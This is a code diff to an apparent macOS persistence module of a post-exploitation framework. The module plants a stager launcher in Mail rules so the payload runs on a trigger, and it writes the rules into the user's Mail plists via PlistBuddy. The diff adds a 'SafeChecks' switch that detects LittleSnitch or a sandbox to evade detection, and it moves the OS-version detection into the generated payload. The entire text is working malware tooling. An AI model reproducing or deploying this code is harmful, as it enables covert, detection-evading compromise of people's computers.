@@ -53,6 +53,11 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'SafeChecks': {
+                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+                'Required': True,
+                'Value': 'True'
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -91,7 +96,8 @@ class Module:
         trigger = self.options['Trigger']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent)
+        safeChecks = self.options['SafeChecks']['Value']
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
         launcher = launcher.replace('"', '\\"')
         launcher = launcher.replace('"', '\\"')
         launcher = "do shell script \"%s\"" % (launcher)
@@ -102,24 +108,6 @@ class Module:
                 [choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(12)])
         CriterionUniqueId = UUID()
         RuleId = UUID()
-        with open("/System/Library/CoreServices/SystemVersion.plist", 'r') as a:
-            v = a.read()
-            version = "V1"
-            if "10.7" in v:
-                version = "V2"
-            if "10.7" in v:
-                version = "V2"
-            if "10.8" in v:
-                version = "V2"
-            if "10.9" in v:
-                version = "V2"
-            if "10.10" in v:
-                version = "V2"
-            if "10.11" in v:
-                version = "V3"
-            if "10.12" in v:
-                version = "V4"
-            a.close()
         TimeStamp = str(int(time()))[0:9]
         SyncedRules = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
         RulesActiveState = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
@@ -210,14 +198,35 @@ with open(script, 'w+') as f:
     f.write(payload)
     f.close()
 
-if os.path.isfile(home + "/Library/Mobile Documents/com~apple~mail/Data/V3/MailData/ubiquitous_SyncedRules.plist"):
-    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\ Documents/com~apple~mail/Data/%s/MailData/ubiquitous_SyncedRules.plist")
-else:
-    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mail/%s/MailData/SyncedRules.plist")
+with open("/System/Library/CoreServices/SystemVersion.plist", 'r') as a:
+            v = a.read()
+            version = "V1"
+            if "10.7" in v:
+                version = "V2"
+            if "10.7" in v:
+                version = "V2"
+            if "10.8" in v:
+                version = "V2"
+            if "10.9" in v:
+                version = "V2"
+            if "10.10" in v:
+                version = "V2"
+            if "10.11" in v:
+                version = "V3"
+            if "10.12" in v:
+                version = "V4"
+            a.close()
 
-os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/%s/MailData/RulesActiveState.plist")
+if os.path.isfile(home + "/Library/Mobile Documents/com~apple~mail/Data/" + version + "/MailData/ubiquitous_SyncedRules.plist"):
+    print "Trying to write to Mobile"
+    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\ Documents/com~apple~mail/Data/" + version + "/MailData/ubiquitous_SyncedRules.plist")
+else:
+    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mail/" + version + "/MailData/SyncedRules.plist")
+    print "Writing to main rules"
+
+os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/" + version + "/MailData/RulesActiveState.plist")
 os.system("rm " + SyncedRules)
 os.system("rm " + RulesActiveState)
 
-        """ % (AppleScript, SyncedRules, RulesActiveState, plist, plist2, launcher, version, version, version)
+        """ % (AppleScript, SyncedRules, RulesActiveState, plist, plist2, launcher)
         return script
